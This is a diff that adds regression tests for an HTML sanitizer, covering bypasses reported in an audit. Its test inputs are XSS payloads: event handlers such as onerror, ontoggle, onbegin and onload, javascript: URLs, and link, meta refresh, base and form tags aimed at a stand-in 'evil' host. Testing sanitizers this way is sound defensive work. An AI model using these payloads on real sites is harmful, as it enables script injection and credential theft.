@@ -163,3 +163,92 @@ def test_strips_multiline_script(ch):
     assert "<script" not in got["html"]
     assert "line1" not in got["html"]
     assert "a" in got["html"] and "b" in got["html"]
+
+
+# ---- Regression: pre-existing bypasses caught in the May 2026 audit ----
+
+def test_strips_unquoted_event_handler(ch):
+    panel = '{"type":"html","html":"<img src=x onerror=alert(1)>tail"}'
+    got = _sanitize(ch, panel)
+    assert "onerror" not in got["html"].lower()
+    assert "alert" not in got["html"]
+    assert "tail" in got["html"]
+
+
+def test_strips_unquoted_handler_with_complex_value(ch):
+    # The unquoted branch must terminate on whitespace / >, not eat the rest
+    # of the tag. `src=x` after `ontoggle=...` should survive only if the
+    # tag itself survives; here `details` is not in the strip list so the
+    # tag stays, just without the handler attribute.
+    panel = '{"type":"html","html":"<details ontoggle=javascript:alert(1) open>x</details>"}'
+    got = _sanitize(ch, panel)
+    assert "ontoggle" not in got["html"].lower()
+    assert "javascript:" not in got["html"].lower()
+    # The benign attribute and body survive.
+    assert "open" in got["html"]
+    assert ">x</details>" in got["html"]
+
+
+def test_strips_svg_with_inner_animation(ch):
+    # SMIL `<animate onbegin=...>` was the canonical svg-bypass payload.
+    # Stripping the whole svg block removes both the unquoted handler and
+    # the animation element in one move.
+    panel = '{"type":"html","html":"a<svg><animate onbegin=alert(1) attributeName=x/></svg>b"}'
+    got = _sanitize(ch, panel)
+    assert "<svg" not in got["html"].lower()
+    assert "<animate" not in got["html"].lower()
+    assert "onbegin" not in got["html"].lower()
+    assert "alert" not in got["html"]
+    assert "a" in got["html"] and "b" in got["html"]
+
+
+def test_strips_orphan_svg(ch):
+    panel = '{"type":"html","html":"<svg onload=alert(1)>no close"}'
+    got = _sanitize(ch, panel)
+    assert "<svg" not in got["html"].lower()
+    assert "onload" not in got["html"].lower()
+
+
+def test_strips_math_block(ch):
+    panel = '{"type":"html","html":"<math><mtext>x</mtext></math>after"}'
+    got = _sanitize(ch, panel)
+    assert "<math" not in got["html"].lower()
+    assert "after" in got["html"]
+
+
+def test_strips_style_block(ch):
+    # CSS inside <style> can carry attack payloads via expression()/url();
+    # easier to remove the element wholesale.
+    panel = '{"type":"html","html":"<style>body{background:url(javascript:alert(1))}</style>kept"}'
+    got = _sanitize(ch, panel)
+    assert "<style" not in got["html"].lower()
+    assert "javascript:" not in got["html"].lower()
+    assert "kept" in got["html"]
+
+
+def test_strips_link_tag(ch):
+    panel = '{"type":"html","html":"<link rel=\\"preload\\" as=\\"script\\" href=\\"//evil/x.js\\">kept"}'
+    got = _sanitize(ch, panel)
+    assert "<link" not in got["html"].lower()
+    assert "kept" in got["html"]
+
+
+def test_strips_meta_refresh(ch):
+    panel = '{"type":"html","html":"<meta http-equiv=\\"refresh\\" content=\\"0;url=//evil\\">kept"}'
+    got = _sanitize(ch, panel)
+    assert "<meta" not in got["html"].lower()
+    assert "kept" in got["html"]
+
+
+def test_strips_base_tag(ch):
+    panel = '{"type":"html","html":"<base href=\\"//evil/\\">kept"}'
+    got = _sanitize(ch, panel)
+    assert "<base" not in got["html"].lower()
+    assert "kept" in got["html"]
+
+
+def test_strips_form_block(ch):
+    panel = '{"type":"html","html":"<form action=\\"//evil\\" method=\\"post\\"><input name=x></form>kept"}'
+    got = _sanitize(ch, panel)
+    assert "<form" not in got["html"].lower()
+    assert "kept" in got["html"]
